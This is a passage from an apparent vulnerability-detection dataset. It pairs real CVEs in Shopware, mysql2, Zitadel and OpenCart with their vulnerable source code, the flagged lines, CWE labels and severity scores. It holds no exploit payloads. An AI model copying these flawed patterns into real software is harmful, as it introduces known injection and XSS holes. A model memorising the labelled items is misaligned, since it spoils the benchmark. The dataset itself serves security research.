}\n\n    public function getSource(): ContextSource\n    {\n        return $this->source;\n    }\n\n    public function getVersionId(): string\n    {\n        return $this->versionId;\n    }\n\n    public function getLanguageId(): string\n    {\n        return $this->languageIdChain[0];\n    }\n\n    public function getCurrencyId(): string\n    {\n        return $this->currencyId;\n    }\n\n    public function getCurrencyFactor(): float\n    {\n        return $this->currencyFactor;\n    }\n\n    /**\n     * @return array<string>\n     */\n    public function getRuleIds(): array\n    {\n        return $this->ruleIds;\n    }\n\n    /**\n     * @return non-empty-array<string>\n     */\n    public function getLanguageIdChain(): array\n    {\n        return $this->languageIdChain;\n    }\n\n    public function createWithVersionId(string $versionId): self\n    {\n        $context = new self(\n            $this->source,\n            $this->ruleIds,\n            $this->currencyId,\n            $this->languageIdChain,\n            $versionId,\n            $this->currencyFactor,\n            $this->considerInheritance,\n            $this->taxState,\n            $this->rounding\n        );\n        $context->scope = $this->scope;\n\n        foreach ($this->getExtensions() as $key => $extension) {\n            $context->addExtension($key, $extension);\n        }\n\n        return $context;\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $callback\n     *\n     * @return TReturn the return value of the provided callback function\n     */\n    public function scope(string $scope, callable $callback)\n    {\n        $currentScope = $this->getScope();\n        $this->scope = $scope;\n\n        try {\n            $result = $callback($this);\n        } finally {\n            $this->scope = $currentScope;\n        }\n\n        return $result;\n    }\n\n    public function getScope(): string\n    {\n        return $this->scope;\n    }\n\n    public function considerInheritance(): bool\n    {\n        return $this->considerInheritance;\n    }\n\n    public function setConsiderInheritance(bool $considerInheritance): void\n    {\n        $this->considerInheritance = $considerInheritance;\n    }\n\n    public function getTaxState(): string\n    {\n        return $this->taxState;\n    }\n\n    public function setTaxState(string $taxState): void\n    {\n        $this->taxState = $taxState;\n    }\n\n    public function isAllowed(string $privilege): bool\n    {\n        if ($this->source instanceof AdminApiSource) {\n            return $this->source->isAllowed($privilege);\n        }\n\n        return true;\n    }\n\n    /**\n     * @param array<string> $ruleIds\n     */\n    public function setRuleIds(array $ruleIds): void\n    {\n        if ($this->rulesLocked) {\n            throw new ContextRulesLockedException();\n        }\n\n        $this->ruleIds = array_filter(array_values($ruleIds));\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $function\n     *\n     * @return TReturn\n     */\n    public function enableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = true;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $function\n     *\n     * @return TReturn\n     */\n    public function disableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = false;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }\n\n    public function getApiAlias(): string\n    {\n        return 'context';\n    }\n\n    public function getRounding(): CashRoundingConfig\n    {\n        return $this->rounding;\n    }\n\n    public function setRounding(CashRoundingConfig $rounding): void\n    {\n        $this->rounding = $rounding;\n    }\n\n    public function lockRules(): void\n    {\n        $this->rulesLocked = true;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function scope(string $scope, callable $callback)\n    {\n        $currentScope = $this->getScope();\n        $this->scope = $scope;\n\n        try {\n            $result = $callback($this);\n        } finally {\n            $this->scope = $currentScope;\n        }\n\n        return $result;\n    }",
        "public function enableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = true;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }",
        "public function disableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = false;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 151,
          "content": "    public function scope(string $scope, callable $callback)"
        },
        {
          "line_no": 218,
          "content": "    public function enableInheritance(callable $function)"
        },
        {
          "line_no": 235,
          "content": "    public function disableInheritance(callable $function)"
        }
      ]
    },
    "cwe": [
      "CWE-94",
      "CWE-1336"
    ],
    "severity": "HIGH",
    "cvss_score": 8.3,
    "cvss_version": 3.1
  },
  {
    "id": 571,
    "cve": "CVE-2024-21507",
    "description": "Versions of the package mysql2 before 3.9.3 are vulnerable to Improper Input Validation through the keyFromFields function, resulting in cache poisoning. An attacker can inject a colon (:) character within a value of the attacker-crafted key.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/parsers/parser_cache.js",
          "content": "'use strict';\n\nconst LRU = require('lru-cache').default;\n\nconst parserCache = new LRU({\n  max: 15000\n});\n\nfunction keyFromFields(type, fields, options, config) {\n  let res =\n    `${type}` +\n    `/${typeof options.nestTables}` +\n    `/${options.nestTables}` +\n    `/${options.rowsAsArray}` +\n    `/${options.supportBigNumbers || config.supportBigNumbers}` +\n    `/${options.bigNumberStrings || config.bigNumberStrings}` +\n    `/${typeof options.typeCast}` +\n    `/${options.timezone || config.timezone}` +\n    `/${options.decimalNumbers}` +\n    `/${options.dateStrings}`;\n  for (let i = 0; i < fields.length; ++i) {\n    const field = fields[i];\n    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;\n  }\n  return res;\n}\n\nfunction getParser(type, fields, options, config, compiler) {\n  const key = keyFromFields(type, fields, options, config);\n  let parser = parserCache.get(key);\n\n  if (parser) {\n    return parser;\n  }\n\n  parser = compiler(fields, options, config);\n  parserCache.set(key, parser);\n  return parser;\n}\n\nfunction setMaxCache(max) {\n  parserCache.max = max;\n}\n\nfunction clearCache() {\n  parserCache.clear();\n}\n\nmodule.exports = {\n  getParser: getParser,\n  setMaxCache: setMaxCache,\n  clearCache: clearCache\n};\n"
        }
      ],
      "method_level": [
        "function keyFromFields(type, fields, options, config) {\n  let res =\n    `${type}` +\n    `/${typeof options.nestTables}` +\n    `/${options.nestTables}` +\n    `/${options.rowsAsArray}` +\n    `/${options.supportBigNumbers || config.supportBigNumbers}` +\n    `/${options.bigNumberStrings || config.bigNumberStrings}` +\n    `/${typeof options.typeCast}` +\n    `/${options.timezone || config.timezone}` +\n    `/${options.decimalNumbers}` +\n    `/${options.dateStrings}`;\n  for (let i = 0; i < fields.length; ++i) {\n    const field = fields[i];\n    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;\n  }\n  return res;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 10,
          "content": "  let res ="
        },
        {
          "line_no": 11,
          "content": "    `${type}` +"
        },
        {
          "line_no": 12,
          "content": "    `/${typeof options.nestTables}` +"
        },
        {
          "line_no": 13,
          "content": "    `/${options.nestTables}` +"
        },
        {
          "line_no": 14,
          "content": "    `/${options.rowsAsArray}` +"
        },
        {
          "line_no": 15,
          "content": "    `/${options.supportBigNumbers || config.supportBigNumbers}` +"
        },
        {
          "line_no": 16,
          "content": "    `/${options.bigNumberStrings || config.bigNumberStrings}` +"
        },
        {
          "line_no": 17,
          "content": "    `/${typeof options.typeCast}` +"
        },
        {
          "line_no": 18,
          "content": "    `/${options.timezone || config.timezone}` +"
        },
        {
          "line_no": 19,
          "content": "    `/${options.decimalNumbers}` +"
        },
        {
          "line_no": 20,
          "content": "    `/${options.dateStrings}`;"
        },
        {
          "line_no": 23,
          "content": "    res += `/${field.name}:${field.columnType}:${field.length}:${field.schema}:${field.table}:${field.flags}:${field.characterSet}`;"
        },
        {
          "line_no": 25,
          "content": "  return res;"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 1066,
    "cve": "CVE-2024-42356",
    "description": "Shopware is an open commerce platform. Prior to versions 6.6.5.1 and 6.5.8.13, the `context` variable is injected into almost any Twig Template and allows to access to current language, currency information. The context object allows also to switch for a short time the scope of the Context as a helper with a callable function. The function can be called also from Twig and as the second parameter allows any callable, it's possible to call from Twig any statically callable PHP function/method. It's not possible as customer to provide any Twig code, the attacker would require access to Administration to exploit it using Mail templates or using App Scripts. Update to Shopware 6.6.5.1 or 6.5.8.13 to receive a patch. For older versions of 6.1, 6.2, 6.3 and 6.4 corresponding security measures are also available via a plugin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Core/Framework/Context.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Shopware\\Core\\Framework;\n\nuse Shopware\\Core\\Checkout\\Cart\\Price\\Struct\\CartPrice;\nuse Shopware\\Core\\Defaults;\nuse Shopware\\Core\\Framework\\Api\\Context\\AdminApiSource;\nuse Shopware\\Core\\Framework\\Api\\Context\\ContextSource;\nuse Shopware\\Core\\Framework\\Api\\Context\\SystemSource;\nuse Shopware\\Core\\Framework\\DataAbstractionLayer\\Pricing\\CashRoundingConfig;\nuse Shopware\\Core\\Framework\\Log\\Package;\nuse Shopware\\Core\\Framework\\Struct\\StateAwareTrait;\nuse Shopware\\Core\\Framework\\Struct\\Struct;\nuse Shopware\\Core\\System\\SalesChannel\\Exception\\ContextRulesLockedException;\nuse Symfony\\Component\\Serializer\\Annotation\\Ignore;\n\n#[Package('core')]\nclass Context extends Struct\n{\n    use StateAwareTrait;\n\n    final public const SYSTEM_SCOPE = 'system';\n    final public const USER_SCOPE = 'user';\n    final public const CRUD_API_SCOPE = 'crud';\n\n    final public const SKIP_TRIGGER_FLOW = 'skipTriggerFlow';\n\n    /**\n     * @var non-empty-array<string>\n     */\n    protected array $languageIdChain;\n\n    protected string $scope = self::USER_SCOPE;\n\n    protected bool $rulesLocked = false;\n\n    #[Ignore]\n    protected $extensions = [];\n\n    /**\n     * @param array<string> $languageIdChain\n     * @param array<string> $ruleIds\n     */\n    public function __construct(\n        protected ContextSource $source,\n        protected array $ruleIds = [],\n        protected string $currencyId = Defaults::CURRENCY,\n        array $languageIdChain = [Defaults::LANGUAGE_SYSTEM],\n        protected string $versionId = Defaults::LIVE_VERSION,\n        protected float $currencyFactor = 1.0,\n        protected bool $considerInheritance = false,\n        /**\n         * @see CartPrice::TAX_STATE_GROSS, CartPrice::TAX_STATE_NET, CartPrice::TAX_STATE_FREE\n         */\n        protected string $taxState = CartPrice::TAX_STATE_GROSS,\n        protected CashRoundingConfig $rounding = new CashRoundingConfig(2, 0.01, true)\n    ) {\n        if ($source instanceof SystemSource) {\n            $this->scope = self::SYSTEM_SCOPE;\n        }\n\n        if (empty($languageIdChain)) {\n            throw new \\InvalidArgumentException('Argument languageIdChain must not be empty');\n        }\n\n        /** @var non-empty-array<string> $chain */\n        $chain = array_keys(array_flip(array_filter($languageIdChain)));\n        $this->languageIdChain = $chain;\n    }\n\n    /**\n     * @internal\n     */\n    public static function createDefaultContext(?ContextSource $source = null): self\n    {\n        $source ??= new SystemSource();\n\n        return new self($source);\n    }\n\n    public function getSource(): ContextSource\n    {\n        return $this->source;\n    }\n\n    public function getVersionId(): string\n    {\n        return $this->versionId;\n    }\n\n    public function getLanguageId(): string\n    {\n        return $this->languageIdChain[0];\n    }\n\n    public function getCurrencyId(): string\n    {\n        return $this->currencyId;\n    }\n\n    public function getCurrencyFactor(): float\n    {\n        return $this->currencyFactor;\n    }\n\n    /**\n     * @return array<string>\n     */\n    public function getRuleIds(): array\n    {\n        return $this->ruleIds;\n    }\n\n    /**\n     * @return non-empty-array<string>\n     */\n    public function getLanguageIdChain(): array\n    {\n        return $this->languageIdChain;\n    }\n\n    public function createWithVersionId(string $versionId): self\n    {\n        $context = new self(\n            $this->source,\n            $this->ruleIds,\n            $this->currencyId,\n            $this->languageIdChain,\n            $versionId,\n            $this->currencyFactor,\n            $this->considerInheritance,\n            $this->taxState,\n            $this->rounding\n        );\n        $context->scope = $this->scope;\n\n        foreach ($this->getExtensions() as $key => $extension) {\n            $context->addExtension($key, $extension);\n        }\n\n        return $context;\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $callback\n     *\n     * @return TReturn the return value of the provided callback function\n     */\n    public function scope(string $scope, callable $callback)\n    {\n        $currentScope = $this->getScope();\n        $this->scope = $scope;\n\n        try {\n            $result = $callback($this);\n        } finally {\n            $this->scope = $currentScope;\n        }\n\n        return $result;\n    }\n\n    public function getScope(): string\n    {\n        return $this->scope;\n    }\n\n    public function considerInheritance(): bool\n    {\n        return $this->considerInheritance;\n    }\n\n    public function setConsiderInheritance(bool $considerInheritance): void\n    {\n        $this->considerInheritance = $considerInheritance;\n    }\n\n    public function getTaxState(): string\n    {\n        return $this->taxState;\n    }\n\n    public function setTaxState(string $taxState): void\n    {\n        $this->taxState = $taxState;\n    }\n\n    public function isAllowed(string $privilege): bool\n    {\n        if ($this->source instanceof AdminApiSource) {\n            return $this->source->isAllowed($privilege);\n        }\n\n        return true;\n    }\n\n    /**\n     * @param array<string> $ruleIds\n     */\n    public function setRuleIds(array $ruleIds): void\n    {\n        if ($this->rulesLocked) {\n            throw new ContextRulesLockedException();\n        }\n\n        $this->ruleIds = array_filter(array_values($ruleIds));\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $function\n     *\n     * @return TReturn\n     */\n    public function enableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = true;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }\n\n    /**\n     * @template TReturn of mixed\n     *\n     * @param callable(Context): TReturn $function\n     *\n     * @return TReturn\n     */\n    public function disableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = false;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }\n\n    public function getApiAlias(): string\n    {\n        return 'context';\n    }\n\n    public function getRounding(): CashRoundingConfig\n    {\n        return $this->rounding;\n    }\n\n    public function setRounding(CashRoundingConfig $rounding): void\n    {\n        $this->rounding = $rounding;\n    }\n\n    public function lockRules(): void\n    {\n        $this->rulesLocked = true;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function scope(string $scope, callable $callback)\n    {\n        $currentScope = $this->getScope();\n        $this->scope = $scope;\n\n        try {\n            $result = $callback($this);\n        } finally {\n            $this->scope = $currentScope;\n        }\n\n        return $result;\n    }",
        "public function enableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = true;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }",
        "public function disableInheritance(callable $function)\n    {\n        $previous = $this->considerInheritance;\n        $this->considerInheritance = false;\n        $result = $function($this);\n        $this->considerInheritance = $previous;\n\n        return $result;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 151,
          "content": "    public function scope(string $scope, callable $callback)"
        },
        {
          "line_no": 218,
          "content": "    public function enableInheritance(callable $function)"
        },
        {
          "line_no": 235,
          "content": "    public function disableInheritance(callable $function)"
        }
      ]
    },
    "cwe": [
      "CWE-94",
      "CWE-1336"
    ],
    "severity": "HIGH",
    "cvss_score": 8.3,
    "cvss_version": 3.1
  },
  {
    "id": 1038,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 881,
    "cve": "CVE-2024-21516",
    "description": "This affects versions of the package opencart/opencart from 4.0.0.0 and before 4.1.0.0. A reflected XSS issue was identified in the directory parameter of admin common/filemanager.list route. An attacker could obtain a user's token by tricking the user to click on a maliciously crafted URL. The user is then prompted to login and redirected again upon authentication with the payload automatically executing. If the attacked user has admin privileges, this vulnerability could be used as the start of a chain of exploits like Zip Slip or arbitrary file write vulnerabilities in the admin functionality.\r\r**Notes:**\r\r1) This is only exploitable if the attacker knows the name or path of the admin directory. The name of the directory is \"admin\" by default but there is a pop-up in the dashboard warning users to rename it.\r\r2) The fix for this vulnerability is incomplete. The redirect is removed so that it is not possible for an attacker to control the redirect post admin login anymore, but it is still possible to exploit this issue in admin if the user is authenticated as an admin already.",
    "vulnerability": {
      "file_level": [
        {
          "name": "upload/admin/controller/common/login.php",
          "content": "<?php\nnamespace Opencart\\Admin\\Controller\\Common;\n/**\n * Class Login\n *\n * @package Opencart\\Admin\\Controller\\Common\n */\nclass Login extends \\Opencart\\System\\Engine\\Controller {\n\t/**\n\t * Index\n\t *\n\t * @return void\n\t */\n\tpublic function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}\n\n\t/**\n\t * Login\n\t *\n\t * @return void\n\t */\n\tpublic function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = $this->load->controller('common/header');\n\t\t$data['footer'] = $this->load->controller('common/footer');\n\n\t\t$this->response->setOutput($this->load->view('common/login', $data));\n\t}",
        "public function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 54,
          "content": "\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {"
        },
        {
          "line_no": 55,
          "content": "\t\t\t$args = $this->request->get;"
        },
        {
          "line_no": 57,
          "content": "\t\t\t$route = $args['route'];"
        },
        {
          "line_no": 59,
          "content": "\t\t\tunset($args['route']);"
        },
        {
          "line_no": 60,
          "content": "\t\t\tunset($args['user_token']);"
        },
        {
